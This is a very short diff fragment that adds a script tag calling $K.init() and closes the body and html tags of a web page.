+    <script>$K.init();</script>
+</body>
+</html>
